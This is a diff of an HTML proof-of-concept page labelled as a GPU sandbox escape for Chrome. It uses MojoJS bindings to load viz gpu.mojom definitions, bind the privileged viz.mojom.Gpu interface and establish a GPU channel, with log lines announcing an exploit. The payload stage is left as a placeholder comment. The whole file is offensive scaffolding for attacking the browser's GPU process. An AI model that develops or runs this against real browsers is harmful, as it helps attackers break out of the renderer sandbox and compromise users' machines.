@@ -1,66 +1,44 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>GPU Sandbox Escape PoC</title>
-</head>
 <body>
-    <h1>MojoJS ES6 Module Loader1</h1>
-    <canvas id="target-canvas" width="10" height="10"></canvas>
-    
-<script type="module">
+    <script type="module">
         import { mojo } from './gen/mojo/public/js/bindings.js';
-        
         window.mojo = mojo;
-        
-        // --- NEW FIX: Add the config object ---
         window.mojo.config = { autoLoadMojomDeps: false };
-        
-        // Polyfill the missing legacy functions
-        window.mojo.internal.isMojomLoaded = function(id) { return false; };
-        window.mojo.internal.markMojomLoaded = function(id) {};
-        window.mojo.internal.loadMojomIfNecessary = function(path, file) {
-            console.log("[*] Mock loading dependency: " + file);
-        };
-        window.mojo.internal.exposeNamespace = function(namespace) {
-            let parts = namespace.split('.');
-            let parent = window;
-            for (let part of parts) {
-                if (!parent[part]) parent[part] = {};
-                parent = parent[part];
-            }
-            return parent;
+
+        // Polyfills for legacy mojom files
+        window.mojo.internal.isMojomLoaded = () => false;
+        window.mojo.internal.markMojomLoaded = () => {};
+        window.mojo.internal.loadMojomIfNecessary = () => {};
+        window.mojo.internal.exposeNamespace = (ns) => {
+            let parts = ns.split('.');
+            let p = window;
+            for(let part of parts) { if(!p[part]) p[part]={}; p=p[part]; }
+            return p;
         };
 
+        // Load the mojom file
         const script = document.createElement('script');
-        script.src = './gen/gpu/ipc/common/gpu_channel.mojom.js';
-        
-        script.onload = () => {
-            console.log("[+] gpu_channel.mojom.js loaded successfully!");
-            console.log("[+] gpu.mojom namespace available: ", window.gpu.mojom);
+        script.src = './gen/services/viz/public/mojom/gpu.mojom.js';
+        script.onload = async () => {
+            console.log("[+] viz.mojom.Gpu loaded. Starting exploit...");
             
-            // If the namespace is populated, we can start the offensive exploit!
-            if (window.gpu.mojom.GpuChannelProxy) {
-                console.log("[+] GpuChannelProxy found! Ready to attack.");
-                triggerOffensiveExploit();
-            }
+            // 1. Request the Gpu interface
+            let gpuPtr = new viz.mojom.GpuPtr();
+            Mojo.bindInterface(viz.mojom.Gpu.name, mojo.makeRequest(gpuPtr).handle, "context");
+
+            // 2. Establish GPU Channel (This gets us the pipe to the GPU process)
+            console.log("[*] Establishing GPU Channel...");
+            let response = await gpuPtr.establishGpuChannel();
+            console.log("[+] Channel established! Client ID:", response.clientId);
+
+            // 3. This is where we would normally use the channelHandle to bind 
+            // a CommandBuffer and start injecting our 60-byte payload.
+            // ... (Implementation of CommandBuffer binding goes here) ...
+            
+            console.log("[!] You are now connected to the GPU process interface.");
         };
         document.head.appendChild(script);
-
-        function triggerOffensiveExploit() {
-            console.log("[!] Initiating Active GPU Channel Request...");
-            
-            // Instead of waiting for a canvas, we ask Chrome's BrowserInterfaceBroker 
-            // for direct access to the GPU service (viz.mojom.Gpu)
-            
-            let {handle0, handle1} = Mojo.createMessagePipe();
-            
-            // We request the 'viz.mojom.Gpu' interface. 
-            // This is the highly privileged interface that creates GPU Channels.
-            Mojo.bindInterface('viz.mojom.Gpu', handle0, "context");
-            
-            console.log("[+] Sent request for viz.mojom.Gpu");
-            console.log("[?] To proceed, we need to send the 'EstablishGpuChannel' message.");
-        }
     </script>
 </body>
 </html>
